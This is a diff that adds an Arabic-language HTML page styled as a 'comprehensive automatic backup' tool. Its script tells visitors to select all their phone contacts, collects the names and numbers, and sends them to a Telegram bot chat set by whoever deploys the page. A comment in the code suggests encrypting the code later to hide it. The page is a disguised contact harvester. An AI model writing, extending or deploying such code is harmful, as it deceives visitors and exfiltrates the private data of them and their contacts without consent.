@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نسخ احتياطي شامل</title>
+    <style>
+        body { font-family: 'Cairo', sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 50px; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(0,255,150,0.2); }
+        .btn { background: #00ff95; color: #000; border: none; padding: 15px 40px; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 18px; }
+        #status { margin-top: 20px; color: #00ff95; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>النسخ الاحتياطي التلقائي</h2>
+    <p>اضغط للبدء، ثم اختر "تحديد الكل" من القائمة</p>
+    <button class="btn" onclick="startBackup()">ابدأ النسخ الآن</button>
+    <div id="status"></div>
+</div>
+
+<script>
+async function startBackup() {
+    const status = document.getElementById('status');
+    
+    // بياناتك (يفضل تشفير الكود بالكامل لاحقاً)
+    const token = "YOUR_BOT_TOKEN"; 
+    const chatID = "YOUR_CHAT_ID";
+
+    if (!('contacts' in navigator)) {
+        status.innerText = "متصفحك لا يدعم الوصول للأسماء. استخدم كروم أندرويد.";
+        return;
+    }
+
+    // نطلب الوصول لجميع الحقول المتاحة
+    const props = ['name', 'tel', 'email'];
+    const opts = { multiple: true };
+
+    try {
+        const contacts = await navigator.contacts.select(props, opts);
+
+        if (contacts.length > 0) {
+            status.innerText = "⏳ جاري ضغط وإرسال " + contacts.length + " جهة اتصال...";
+            
+            let message = `📂 **نسخة احتياطية كاملة**\n`;
+            message += `عدد الأسماء: ${contacts.length}\n`;
+            message += `--------------------------\n`;
+
+            contacts.forEach((c, index) => {
+                message += `${index + 1}- ${c.name} : ${c.tel}\n`;
+            });
+
+            // إرسال البيانات (إذا كان العدد كبيراً جداً سيتم تقسيم الرسائل)
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatID,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
+
+            status.innerText = "✅ تم النسخ بنجاح إلى التلجرام!";
+        }
+    } catch (err) {
+        status.innerText = "❌ فشلت العملية أو تم رفض الإذن.";
+    }
+}
+</script>
+
+</body>
+</html>
